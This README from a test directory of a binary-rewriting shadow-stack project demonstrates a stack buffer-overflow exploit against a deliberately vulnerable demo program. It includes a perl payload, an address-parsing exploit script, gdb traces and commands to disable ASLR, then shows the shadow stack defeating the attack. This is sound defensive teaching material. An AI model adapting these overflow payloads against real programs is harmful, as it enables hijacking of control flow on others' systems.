TL;DR: try ./test1.sh and ./test2.sh.

This directory contains a vulnerable program, vuln.c, with a buffer overrun.
The attacker's goal is to use the buffer overrun to overwrite the instruction
pointer and execute the function attacker_target. To build, run

$ make

Let's first consider how you would exploit this program without the address
randomization of ASLR. You can disable ASLR with

$ setarch `uname -m` -R /bin/bash

but a simpler approach is to run programs within gdb, which will disable ASLR.
We can see that, on this system, the target is always at 0x5555555547da. Hence
we can generate an exploit like so. The buffer is 64 bytes, followed by an
8-byte base pointer, followed by the 8-byte return address.

$ perl -e 'print "A"x(64+8) . "\xda\x47\x55\x55\x55\x55\x00\x00"' > vuln.gdb.in
$ gdb -q ./vuln
Reading symbols from ./vuln...(no debugging symbols found)...done.
(gdb) run < vuln.gdb.in
Starting program: /home/egalito/egalito-shadow-stack-app/test/vuln < vuln.gdb.in
buf is at 0x7fffffffe370, target is at 0x5555555547da

buf: [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUUUU]
successful exploit! congratulations.
[Inferior 1 (process 12925) exited with code 01]
(gdb) q

You can also use the script vuln.pl, which works for any target address. It
parses the address and generates an exploit at run time.

$ perl vuln.pl ./vuln
spawn child process {./vuln}
child wrote {buf is at 0x7ffe9019bd80, target is at 0x5618f14517da}
exploit is {AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEV}
child process output {}
child process output {buf: [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEV]}
child process output {successful exploit! congratulations.}
child exited with status 1

This works even on a binary transformed with Egalito. (It also works even if
you add padding, rearrange functions, etc.) Note the different addresses of
attacker_target.

$ ../egalito/app/etelf vuln vuln.m
Transforming file [vuln]
Parsing ELF file...
Performing code generation into [vuln.m]...
$ nm vuln | grep ' T '
0000000000000900 T __libc_csu_fini
0000000000000890 T __libc_csu_init
0000000000000904 T _fini
0000000000000648 T _init
00000000000006d0 T _start
00000000000007da T attacker_target
000000000000085d T main
00000000000007f4 T read_input
$ nm vuln.m | grep ' T '
0000000040000230 T __libc_csu_fini
00000000400001ca T __libc_csu_init
0000000040000232 T _fini
0000000040000000 T _init
0000000040000018 T _start
000000004000011e T attacker_target
000000004000027c T exit@plt
000000004000026c T fflush@plt
000000004000025c T fgets@plt
00000000400001a2 T main
000000004000024c T printf@plt
000000004000023c T puts@plt
0000000040000138 T read_input
$ perl vuln.pl ./vuln.m
spawn child process {./vuln.m}
child wrote {buf is at 0x7fff6c22c2f0, target is at 0x55ed93e3e11e}
exploit is {AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
child process output {}
child process output {buf: [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]}
child process output {successful exploit! congratulations.}
child exited with status 1

Finally, if you have built the shadow stack app, you can use it to defend vuln.

$ ../app/etapp -q vuln vuln.ss
Parsing file [vuln]
Injecting code from our library
Final parsing results:
    parsed Module module-(executable)
    parsed Module module-libc.so.6
    parsed Module module-../app/libinject.so
Adding shadow stack...
Performing code generation into [vuln.ss]...
$ perl vuln.pl ./vuln.ss
spawn child process {./vuln.ss}
child wrote {buf is at 0x7fff10084530, target is at 0x4000024c}
exploit is {AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL@}
child died with signal 4

Notice the exit signal 4, SIGILL, because we intentionally executed an ud2
undefined instruction after the stack integrity violation. You can see this by
examining the core dump in gdb:

$ ulimit -c unlimited
$ perl vuln.pl ./vuln.ss
spawn child process {./vuln.ss}
child wrote {buf is at 0x7ffdf95a63e0, target is at 0x4000024c}
exploit is {AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL@}
child died with signal 4
$ gdb -q vuln.ss core
Reading symbols from vuln.ss...(no debugging symbols found)...done.
[New LWP 12899]
Core was generated by `./vuln.ss'.
Program terminated with signal SIGILL, Illegal instruction.
#0  0x0000000040000000 in egalito_shadowstack_violation ()
(gdb) x/i $rip
=> 0x40000000 <egalito_shadowstack_violation>:  ud2
(gdb) q

Congratulations, that is an indication of a successful defense.
